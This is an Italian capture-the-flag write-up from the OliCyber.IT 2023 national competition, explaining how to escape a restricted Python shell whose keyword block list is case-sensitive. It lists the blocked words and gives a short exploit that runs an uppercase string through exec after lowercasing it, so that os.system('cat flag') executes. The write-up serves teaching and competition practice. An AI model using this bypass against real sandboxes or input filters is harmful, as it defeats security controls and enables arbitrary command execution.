# OliCyber.IT 2023 - Competizione Nazionale

## [misc] Sandbox-v1.py (69 risoluzioni)

La challenge consiste in una sandbox della shell interattiva di python, che differisce da quella standard perché sono state tolte alcune funzioni builtin e viene controllato che il codice inserito non contenga delle parole "pericolose" prima di essere eseguito.
In particolare non viene messa a disposizione la funzione `open` e viene controllato che non siano usate le seguenti parole: `['import', 'os', 'system', 'subproces', 'sh', 'flag']`.
Lo scopo della challenge è leggere il file `./flag`.

### Soluzione

Ci sono numerosi modi per risolvere la challenge, i più semplici sfruttano il fatto che il controllo sulle parole della blacklist è case sensitive, dunque la string `'flag'` verrà bloccata, ma l'espressione `'FLAG'.lower()` può essere eseguita. In un contesto senza restrizioni per leggere la flag è sufficente fare:

```py
import os
os.system('cat flag')
```

Dal momento che è possibile utilizzare la funzione `exec` di python, basta passare come parametro le istruzioni appena citate, usando il trucco del `.lower()` per evadere il controllo sulla blacklist.

### Exploit

Mettendo insieme quello detto sopra otteniamo:

```py
exec("IMPORT OS; OS.SYSTEM('cat FLAG')".lower())
```
